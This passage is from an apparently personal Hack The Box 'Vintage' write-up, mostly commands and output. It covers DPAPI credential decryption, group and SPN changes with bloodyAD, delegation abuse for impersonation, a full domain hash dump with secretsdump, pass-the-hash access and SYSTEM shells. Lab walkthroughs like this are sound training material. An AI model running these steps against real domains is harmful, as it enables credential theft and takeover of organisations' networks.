└─$ impacket-dpapi masterkey -file ./99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -password Zer0the0ne -sid S-1-5-21-4024337825-2033394866-2055507597-1115 | grep 'key:'
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

Decrypt
```bash
└─$ impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
ERROR: Padding is incorrect.
└─$ impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
└─$ impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a | grep Username -aA2
Username    : 02eicexxucchzqre
Unknown     :
```

Hmm... nothing

We tried `Local`, but not `Roaming`
```bash
*Evil-WinRM* PS C:\Users\C.Neri> ls -rec -filter '*Credentials*' -force | %{$_.FullName}
C:\Users\C.Neri\AppData\Local\Microsoft\Credentials
C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials -force -rec | %{$_.FullName}
C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
*Evil-WinRM* PS C:\Users\C.Neri\Documents> attrib -H -S C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
*Evil-WinRM* PS C:\Users\C.Neri\Documents> download C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
└─$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a | grep Username -aA2
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

Great, we got credentials for privileged user.

## Privilege Escalation (Admin)

![Writeup-5.png](/assets/pentest/htb/vintage/Writeup-5.png)

```bash
└─$ impacket-getTGT -dc-ip 'dc01.vintage.htb' 'vintage.htb'/'C.Neri_adm':'Uncr4ck4bl3P4ssW0rd0312' -k
└─$ export KRB5CCNAME=$(readlink -f ../kerberos/C.Neri_adm.ccache)
└─$ bloodyAD --host dc01.vintage.htb -d "vintage.htb" --dc-ip 10.10.11.45 -k add groupMember "DelegatedAdmins" "c.neri_adm"
```

![Writeup-6.png](/assets/pentest/htb/vintage/Writeup-6.png)

Looks like we have to abuse Constrained Delegations
```bash
└─$ netexec ldap dc01.vintage.htb -u c.neri_adm -p Uncr4ck4bl3P4ssW0rd0312 -k --find-delegation
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
LDAP        dc01.vintage.htb 389    DC01             AccountName     AccountType DelegationType             DelegationRightsTo
LDAP        dc01.vintage.htb 389    DC01             --------------- ----------- -------------------------- ------------------
LDAP        dc01.vintage.htb 389    DC01             DelegatedAdmins Group       Resource-Based Constrained DC01$
```

[https://www.thehacker.recipes/ad/**movement**/kerberos/delegations/rbcd](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

![Writeup-7.png](/assets/pentest/htb/vintage/Writeup-7.png)

We can't create machines, but we could probably use `FS01$` or `GMSA01$` (?)
```bash
└─$ netexec ldap dc01.vintage.htb -u c.neri_adm -p Uncr4ck4bl3P4ssW0rd0312 -k -M maq
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
MAQ         dc01.vintage.htb 389    DC01             [*] Getting the MachineAccountQuota
MAQ         dc01.vintage.htb 389    DC01             MachineAccountQuota: 0
```

Soo above with machine will not work, because our user does not have SPN set! 

### SPN-less RDBC

But the 3rd point mentions we can conduct [SPN-less RDBC](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users)
```bash
└─$ powerview 'vintage.htb'/'c.neri_adm':'Uncr4ck4bl3P4ssW0rd0312'@'dc01.vintage.htb' -k
PV > Get-DomainUser -SPN -Properties servicePrincipalName
servicePrincipalName     : kadmin/changepw
```

To gain account with SPN we can just create one, `GMSA$01` is part of ServiceManagers which has GenericAll on `svc_*` accounts. Ideally we would want to use `svc_sql` because we have password and resetting password will not be required.

```bash
impacket-getTGT -dc-ip 'dc01.vintage.htb' 'vintage.htb'/'GMSA01$'  -hashes ':cfa9f6edd15de88ae7a9652114e3f4a7' -k
export KRB5CCNAME=$(readlink -f ./GMSA01\$.ccache)
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --dc-ip 10.10.11.45 -k add groupMember "ServiceManagers" "GMSA01$"
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --dc-ip 10.10.11.45 -k set object svc_sql servicePrincipalName -v 'cifs/letmein.vintage.htb'
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --dc-ip 10.10.11.45 -k get object svc_sql --attr serviceprincipalname
distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
servicePrincipalName: cifs/letmein.vintage.htb
```

::: info :information_source: Note
I tried using `cifs/dc01.vintage.htb` as SPN, but didn't work. Turns out it needs to be unique and shouldn't matter what it's set to as long as it's set.
:::

```bash
impacket-getTGT -dc-ip 'dc01.vintage.htb' 'vintage.htb'/'C.Neri_adm':'Uncr4ck4bl3P4ssW0rd0312' -k
export KRB5CCNAME=$(readlink -f ./C.Neri_adm.ccache)
bloodyAD --host dc01.vintage.htb -d "vintage.htb" --dc-ip 10.10.11.45 -k add groupMember "DelegatedAdmins" "c.neri_adm"
bloodyAD --host dc01.vintage.htb -d "vintage.htb" --dc-ip 10.10.11.45 -k add groupMember "DelegatedAdmins" "svc_sql"

impacket-getTGT -dc-ip 'dc01.vintage.htb' 'vintage.htb'/'svc_sql':'Zer0the0ne' -k
export KRB5CCNAME=$(readlink -f ./svc_sql.ccache)

└─$ impacket-getST 'vintage.htb'/'svc_sql':'Zer0the0ne' -spn 'cifs/dc01.vintage.htb' -impersonate 'L.bianchi_adm' -k -u2u
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating L.bianchi_adm
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user svc_sql or initial TGT not forwardable

└─$ impacket-getST 'vintage.htb'/'svc_sql':'Zer0the0ne' -spn 'cifs/dc01.vintage.htb' -impersonate 'L.bianchi_adm' -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating L.bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in L.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

HackerRecipies mentioned using `-u2u` flag, but it didn't work with it.
```bash
  -u2u                  Request User-to-User ticket
```

```bash
└─$ impacket-secretsdump -k -no-pass -just-dc-ntlm 'dc01.vintage.htb'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Cleaning up...
```

We are not able to login as Administrator, evil-winrm also failed. We are able to login as `L.bianchi_adm`
```bash
└─$ netexec smb dc01.vintage.htb -u Administrator -H '468c7497513f8243b59980f2240a10de' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:468c7497513f8243b59980f2240a10de STATUS_LOGON_TYPE_NOT_GRANTED

└─$ netexec smb dc01.vintage.htb -u L.bianchi_adm -H '6b751449807e0d73065b0423b64687f0' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\L.bianchi_adm:6b751449807e0d73065b0423b64687f0 (Pwn3d!)
```

```bash
└─$ netexec smb dc01.vintage.htb -u L.bianchi_adm -H '6b751449807e0d73065b0423b64687f0' -k -x 'whoami /all'
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\L.bianchi_adm:6b751449807e0d73065b0423b64687f0 (Pwn3d!)
SMB         dc01.vintage.htb 445    dc01             [+] Executed command via wmiexec
SMB         dc01.vintage.htb 445    dc01             USER INFORMATION
SMB         dc01.vintage.htb 445    dc01             ----------------
SMB         dc01.vintage.htb 445    dc01             User Name             SID
SMB         dc01.vintage.htb 445    dc01             ===================== ==============================================
SMB         dc01.vintage.htb 445    dc01             vintage\l.bianchi_adm S-1-5-21-4024337825-2033394866-2055507597-1141
SMB         dc01.vintage.htb 445    dc01             GROUP INFORMATION
SMB         dc01.vintage.htb 445    dc01             -----------------
SMB         dc01.vintage.htb 445    dc01             Group Name                                     Type             SID                                            Attributes
SMB         dc01.vintage.htb 445    dc01             ============================================== ================ ============================================== ===============================================================
SMB         dc01.vintage.htb 445    dc01             Everyone                                       Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             BUILTIN\Users                                  Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             BUILTIN\Administrators                         Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
SMB         dc01.vintage.htb 445    dc01             NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             VINTAGE\Domain Admins                          Group            S-1-5-21-4024337825-2033394866-2055507597-512  Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             VINTAGE\DelegatedAdmins                        Group            S-1-5-21-4024337825-2033394866-2055507597-1131 Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             Authentication authority asserted identity     Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
SMB         dc01.vintage.htb 445    dc01             VINTAGE\Denied RODC Password Replication Group Alias            S-1-5-21-4024337825-2033394866-2055507597-572  Mandatory group, Enabled by default, Enabled group, Local Group
SMB         dc01.vintage.htb 445    dc01             Mandatory Label\High Mandatory Level           Label            S-1-16-12288
SMB         dc01.vintage.htb 445    dc01             PRIVILEGES INFORMATION
SMB         dc01.vintage.htb 445    dc01             ----------------------
SMB         dc01.vintage.htb 445    dc01             Privilege Name                            Description                                                        State
SMB         dc01.vintage.htb 445    dc01             ========================================= ================================================================== =======
SMB         dc01.vintage.htb 445    dc01             SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SMB         dc01.vintage.htb 445    dc01             SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SMB         dc01.vintage.htb 445    dc01             SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SMB         dc01.vintage.htb 445    dc01             SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SMB         dc01.vintage.htb 445    dc01             SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SMB         dc01.vintage.htb 445    dc01             SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SMB         dc01.vintage.htb 445    dc01             SeSystemtimePrivilege                     Change the system time                                             Enabled
SMB         dc01.vintage.htb 445    dc01             SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SMB         dc01.vintage.htb 445    dc01             SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SMB         dc01.vintage.htb 445    dc01             SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SMB         dc01.vintage.htb 445    dc01             SeBackupPrivilege                         Back up files and directories                                      Enabled
SMB         dc01.vintage.htb 445    dc01             SeRestorePrivilege                        Restore files and directories                                      Enabled
SMB         dc01.vintage.htb 445    dc01             SeShutdownPrivilege                       Shut down the system                                               Enabled
SMB         dc01.vintage.htb 445    dc01             SeDebugPrivilege                          Debug programs                                                     Enabled
SMB         dc01.vintage.htb 445    dc01             SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SMB         dc01.vintage.htb 445    dc01             SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SMB         dc01.vintage.htb 445    dc01             SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SMB         dc01.vintage.htb 445    dc01             SeUndockPrivilege                         Remove computer from docking station                               Enabled
SMB         dc01.vintage.htb 445    dc01             SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SMB         dc01.vintage.htb 445    dc01             SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SMB         dc01.vintage.htb 445    dc01             SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SMB         dc01.vintage.htb 445    dc01             SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SMB         dc01.vintage.htb 445    dc01             SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SMB         dc01.vintage.htb 445    dc01             SeTimeZonePrivilege                       Change the time zone                                               Enabled
SMB         dc01.vintage.htb 445    dc01             SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SMB         dc01.vintage.htb 445    dc01             SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
SMB         dc01.vintage.htb 445    dc01             USER CLAIMS INFORMATION
SMB         dc01.vintage.htb 445    dc01             -----------------------
SMB         dc01.vintage.htb 445    dc01             User claims unknown.
SMB         dc01.vintage.htb 445    dc01             Kerberos support for Dynamic Access Control on this device has been disabled.
```

### Root.txt

```bash
└─$ netexec smb dc01.vintage.htb -u L.bianchi_adm -H '6b751449807e0d73065b0423b64687f0' -k -x 'type \Users\Administrator\Desktop\root.txt'
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\L.bianchi_adm:6b751449807e0d73065b0423b64687f0 (Pwn3d!)
SMB         dc01.vintage.htb 445    dc01             [+] Executed command via wmiexec
SMB         dc01.vintage.htb 445    dc01             217ba5e9580f1b4b88c0278774280c5b
```

### Interactive Shell Options

`DCOM` failed, `psexec` also failed. `smbexec` got `system` from adm user and `wmiexec` got adm user.
```bash
└─$ impacket-getTGT -dc-ip 'dc01.vintage.htb' 'vintage.htb'/'L.bianchi_adm' -hashes ':6b751449807e0d73065b0423b64687f0' -k
└─$ export KRB5CCNAME=$(readlink -f ./L.bianchi_adm.ccache)

└─$ impacket-dcomexec -k -no-pass dc01.vintage.htb
[-] DCOM SessionError: code: 0x8000401a - CO_E_RUNAS_LOGON_FAILURE - The server process could not be started because the configured identity is incorrect. Check the user name and password.

└─$ impacket-psexec -k -no-pass dc01.vintage.htb
[*] Requesting shares on dc01.vintage.htb.....
[*] Found writable share ADMIN$
[*] Uploading file ZynKaWCa.exe
[*] Opening SVCManager on dc01.vintage.htb.....
[*] Creating service Qegj on dc01.vintage.htb.....
[*] Starting service Qegj.....
[*] Opening SVCManager on dc01.vintage.htb.....
[-] Error performing the uninstallation, cleaning up

└─$ impacket-smbexec -k -no-pass dc01.vintage.htb
C:\Windows\system32>whoami
nt authority\system

└─$ impacket-wmiexec -k -no-pass dc01.vintage.htb
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vintage\l.bianchi_adm
```